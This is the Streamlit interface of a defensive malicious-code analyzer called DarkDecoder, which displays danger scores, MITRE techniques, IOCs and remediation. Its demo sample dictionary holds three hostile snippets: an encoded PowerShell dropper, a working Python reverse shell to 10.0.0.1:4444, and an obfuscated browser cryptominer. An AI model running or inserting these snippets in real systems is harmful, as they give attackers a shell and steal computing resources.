import streamlit as st
import json
from analyzer import analyze_code

st.set_page_config(
    page_title="DarkDecoder — Malicious Code Analyzer",
    page_icon="🕵️",
    layout="wide",
    initial_sidebar_state="collapsed"
)

st.markdown("""
<style>
@import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@300;400;600;700&display=swap');

html, body, [class*="css"] {
    font-family: 'Inter', sans-serif;
}

.stApp {
    background: #0d1117;
    color: #c9d1d9;
}

.stTextArea textarea {
    background: #161b22 !important;
    color: #79c0ff !important;
    font-family: 'JetBrains Mono', monospace !important;
    font-size: 0.85rem !important;
    border: 1px solid #30363d !important;
    border-radius: 8px !important;
}

.stButton > button {
    background: linear-gradient(135deg, #238636, #2ea043);
    color: white;
    border: none;
    border-radius: 8px;
    font-weight: 600;
    font-size: 1rem;
    padding: 0.6rem 2rem;
    width: 100%;
    transition: all 0.2s;
}

.stButton > button:hover {
    background: linear-gradient(135deg, #2ea043, #3fb950);
    transform: translateY(-1px);
}

.hero {
    text-align: center;
    padding: 2.5rem 0 1.5rem;
    border-bottom: 1px solid #21262d;
    margin-bottom: 2rem;
}

.hero h1 {
    font-size: 3rem;
    font-weight: 700;
    background: linear-gradient(135deg, #58a6ff, #79c0ff, #56d364);
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
    margin: 0;
}

.hero p {
    color: #8b949e;
    font-size: 1.1rem;
    margin-top: 0.5rem;
}

.card {
    background: #161b22;
    border: 1px solid #30363d;
    border-radius: 12px;
    padding: 1.25rem 1.5rem;
    margin-bottom: 1rem;
}

.card h3 {
    color: #58a6ff;
    font-size: 0.8rem;
    font-weight: 600;
    text-transform: uppercase;
    letter-spacing: 0.1em;
    margin: 0 0 0.75rem 0;
}

.danger-ring {
    display: flex;
    align-items: center;
    justify-content: center;
    flex-direction: column;
    padding: 1.5rem;
    border-radius: 12px;
    margin-bottom: 1rem;
}

.danger-critical {
    background: linear-gradient(135deg, #3d0f0f, #5a1a1a);
    border: 2px solid #f85149;
}

.danger-high {
    background: linear-gradient(135deg, #3d1f00, #5a3000);
    border: 2px solid #d29922;
}

.danger-medium {
    background: linear-gradient(135deg, #1f2d00, #2d4000);
    border: 2px solid #3fb950;
}

.danger-low {
    background: linear-gradient(135deg, #0d1117, #161b22);
    border: 2px solid #30363d;
}

.score-number {
    font-size: 5rem;
    font-weight: 700;
    line-height: 1;
    font-family: 'JetBrains Mono', monospace;
}

.score-label {
    font-size: 0.9rem;
    font-weight: 600;
    text-transform: uppercase;
    letter-spacing: 0.15em;
    margin-top: 0.25rem;
}

.critical-color { color: #f85149; }
.high-color { color: #d29922; }
.medium-color { color: #56d364; }
.low-color { color: #8b949e; }

.mitre-badge {
    display: inline-block;
    background: #1f6feb;
    color: #ffffff;
    padding: 0.2rem 0.6rem;
    border-radius: 6px;
    font-size: 0.75rem;
    font-family: 'JetBrains Mono', monospace;
    font-weight: 700;
    margin-right: 0.4rem;
    margin-bottom: 0.3rem;
}

.ioc-tag {
    display: inline-block;
    background: #3d1f00;
    color: #ffa657;
    border: 1px solid #7d4e00;
    padding: 0.15rem 0.5rem;
    border-radius: 4px;
    font-size: 0.78rem;
    font-family: 'JetBrains Mono', monospace;
    margin: 0.15rem;
}

.remediation-step {
    display: flex;
    align-items: flex-start;
    gap: 0.75rem;
    padding: 0.6rem 0;
    border-bottom: 1px solid #21262d;
}

.step-num {
    background: #1f6feb;
    color: white;
    border-radius: 50%;
    width: 1.5rem;
    height: 1.5rem;
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 0.75rem;
    font-weight: 700;
    flex-shrink: 0;
    margin-top: 0.1rem;
}

.classification-tag {
    display: inline-block;
    background: #21262d;
    color: #79c0ff;
    border: 1px solid #30363d;
    padding: 0.3rem 0.8rem;
    border-radius: 20px;
    font-size: 0.85rem;
    font-weight: 600;
}

.sample-btn > button {
    background: #21262d !important;
    color: #8b949e !important;
    border: 1px solid #30363d !important;
    font-size: 0.8rem !important;
    padding: 0.3rem 0.8rem !important;
    width: auto !important;
}

.divider {
    border: none;
    border-top: 1px solid #21262d;
    margin: 1.5rem 0;
}
</style>
""", unsafe_allow_html=True)

# --- Sample malicious code snippets for demo ---
SAMPLES = {
    "PowerShell Dropper": (
        "powershell -nop -w hidden -enc "
        "JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQA5ADIALgAxADYAOAAuADEALgAxADAAJwAsADQANAA0ADQAKQA7AA=="
    ),
    "Python Reverse Shell": (
        "import socket,subprocess,os\n"
        "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n"
        "s.connect(('10.0.0.1',4444))\n"
        "os.dup2(s.fileno(),0)\n"
        "os.dup2(s.fileno(),1)\n"
        "os.dup2(s.fileno(),2)\n"
        "p=subprocess.call(['/bin/sh','-i'])"
    ),
    "JS Cryptominer": (
        "var _0x4f2a=['\\x63\\x72\\x79\\x70\\x74\\x6f','\\x6d\\x69\\x6e\\x65\\x72'];\n"
        "(function(_0x1a2b,_0x3c4d){var _0x5e6f=function(_0x7a8b){while(--_0x7a8b){_0x1a2b['push'](_0x1a2b['shift']())}};\n"
        "_0x5e6f(++_0x3c4d)}(_0x4f2a,0x1f4));\n"
        "var miner=new CoinHive.Anonymous('sOmEwAlLeTkEy123',{threads:navigator.hardwareConcurrency,throttle:0.2});\n"
        "miner.start();"
    ),
}

# --- Header ---
st.markdown("""
<div class="hero">
    <h1>🕵️ DarkDecoder</h1>
    <p>AI-Powered Malicious Code Analysis Engine &nbsp;·&nbsp; Powered by Claude AI</p>
</div>
""", unsafe_allow_html=True)

# --- Input section ---
st.markdown("### Paste Suspicious Code")
st.markdown("<p style='color:#8b949e;font-size:0.9rem;'>Supports: PowerShell · Python · JavaScript · Batch · Bash · PHP · Any language</p>", unsafe_allow_html=True)

# Sample buttons
col1, col2, col3, col4 = st.columns([1, 1, 1, 2])
with col1:
    if st.button("⚡ PowerShell Dropper", key="s1"):
        st.session_state["sample_code"] = SAMPLES["PowerShell Dropper"]
with col2:
    if st.button("🐍 Python Reverse Shell", key="s2"):
        st.session_state["sample_code"] = SAMPLES["Python Reverse Shell"]
with col3:
    if st.button("💰 JS Cryptominer", key="s3"):
        st.session_state["sample_code"] = SAMPLES["JS Cryptominer"]

default_code = st.session_state.get("sample_code", "")
code_input = st.text_area(
    label="code_input",
    label_visibility="collapsed",
    value=default_code,
    placeholder="Paste obfuscated, suspicious, or potentially malicious code here...",
    height=220,
)

analyze_clicked = st.button("🔍 Analyze Code", key="analyze")

if analyze_clicked:
    if not code_input.strip():
        st.warning("Please paste some code to analyze.")
    else:
        with st.spinner("🧠 DarkDecoder is analyzing... this may take 10–20 seconds"):
            try:
                result = analyze_code(code_input)
            except Exception as e:
                st.error(f"Analysis failed: {e}")
                st.stop()

        st.markdown("<hr class='divider'>", unsafe_allow_html=True)
        st.markdown("## Analysis Results")

        # --- Danger score color logic ---
        score = result.get("danger_score", 0)
        if score >= 8:
            ring_class = "danger-critical"
            score_color = "critical-color"
            score_label = "CRITICAL"
        elif score >= 6:
            ring_class = "danger-high"
            score_color = "high-color"
            score_label = "HIGH RISK"
        elif score >= 4:
            ring_class = "danger-medium"
            score_color = "medium-color"
            score_label = "MEDIUM"
        else:
            ring_class = "danger-low"
            score_color = "low-color"
            score_label = "LOW / SAFE"

        # --- Top row: Score + Classification + Intent ---
        col_score, col_meta = st.columns([1, 3])

        with col_score:
            st.markdown(f"""
            <div class="danger-ring {ring_class}">
                <div class="score-number {score_color}">{score}</div>
                <div class="score-label {score_color}">{score_label}</div>
                <div style="color:#8b949e;font-size:0.75rem;margin-top:0.3rem;">out of 10</div>
            </div>
            """, unsafe_allow_html=True)

        with col_meta:
            st.markdown(f"""
            <div class="card">
                <h3>Classification</h3>
                <span class="classification-tag">🏷️ {result.get('classification', 'Unknown')}</span>
            </div>
            <div class="card">
                <h3>Intent</h3>
                <p style="margin:0;color:#e6edf3;line-height:1.6">{result.get('intent', 'N/A')}</p>
            </div>
            <div style="padding:0.5rem 0">
                <p style="color:#8b949e;font-size:0.8rem;margin:0">⚠️ {result.get('danger_justification', '')}</p>
            </div>
            """, unsafe_allow_html=True)

        st.markdown("<hr class='divider'>", unsafe_allow_html=True)

        # --- Middle row: Plain English + Deobfuscated ---
        col_plain, col_deob = st.columns(2)

        with col_plain:
            st.markdown(f"""
            <div class="card">
                <h3>🧑‍💻 Plain English Summary</h3>
                <p style="color:#e6edf3;line-height:1.7;margin:0">{result.get('plain_english_summary', 'N/A')}</p>
            </div>
            """, unsafe_allow_html=True)

        with col_deob:
            st.markdown('<div class="card"><h3>🔓 Deobfuscated Code</h3>', unsafe_allow_html=True)
            deob = result.get("deobfuscated_code", "N/A")
            if deob and deob != "N/A":
                st.code(deob, language="python")
            else:
                st.markdown("<p style='color:#8b949e'>Code appears already readable — no deobfuscation needed.</p>", unsafe_allow_html=True)
            st.markdown('</div>', unsafe_allow_html=True)

        st.markdown("<hr class='divider'>", unsafe_allow_html=True)

        # --- Bottom row: MITRE + IOCs + Remediation ---
        col_mitre, col_ioc, col_rem = st.columns(3)

        with col_mitre:
            st.markdown('<div class="card"><h3>🎯 MITRE ATT&CK Techniques</h3>', unsafe_allow_html=True)
            techniques = result.get("mitre_techniques", [])
            if techniques:
                for t in techniques:
                    st.markdown(f"""
                    <div style="margin-bottom:0.75rem">
                        <span class="mitre-badge">{t.get('id','')}</span>
                        <span style="color:#e6edf3;font-size:0.9rem;font-weight:600">{t.get('name','')}</span>
                        <p style="color:#8b949e;font-size:0.8rem;margin:0.2rem 0 0 0">{t.get('description','')}</p>
                    </div>
                    """, unsafe_allow_html=True)
            else:
                st.markdown("<p style='color:#8b949e'>No techniques identified.</p>", unsafe_allow_html=True)
            st.markdown('</div>', unsafe_allow_html=True)

        with col_ioc:
            st.markdown('<div class="card"><h3>🔎 Indicators of Compromise (IOCs)</h3>', unsafe_allow_html=True)
            iocs = result.get("iocs", {})
            found_any = False
            labels = {
                "ips": "IP", "domains": "Domain", "urls": "URL",
                "file_paths": "Path", "registry_keys": "Registry",
                "mutex_names": "Mutex", "other": "Other"
            }
            for key, label in labels.items():
                items = iocs.get(key, [])
                if items:
                    found_any = True
                    st.markdown(f"<p style='color:#8b949e;font-size:0.75rem;margin:0.5rem 0 0.2rem;text-transform:uppercase;letter-spacing:0.05em'>{label}</p>", unsafe_allow_html=True)
                    for item in items:
                        st.markdown(f'<span class="ioc-tag">{item}</span>', unsafe_allow_html=True)
            if not found_any:
                st.markdown("<p style='color:#8b949e'>No IOCs extracted.</p>", unsafe_allow_html=True)
            st.markdown('</div>', unsafe_allow_html=True)

        with col_rem:
            st.markdown('<div class="card"><h3>🛡️ Remediation Steps</h3>', unsafe_allow_html=True)
            steps = result.get("remediation", [])
            for i, step in enumerate(steps, 1):
                st.markdown(f"""
                <div class="remediation-step">
                    <div class="step-num">{i}</div>
                    <div style="color:#e6edf3;font-size:0.88rem;line-height:1.5">{step}</div>
                </div>
                """, unsafe_allow_html=True)
            st.markdown('</div>', unsafe_allow_html=True)

        st.markdown("<br>", unsafe_allow_html=True)
        st.markdown(f"""
        <div style="text-align:center;color:#8b949e;font-size:0.8rem;padding:1rem;border-top:1px solid #21262d">
            DarkDecoder &nbsp;·&nbsp; Built for Beyond Tomorrow Summit 2026 &nbsp;·&nbsp; Powered by Claude AI
        </div>
        """, unsafe_allow_html=True)
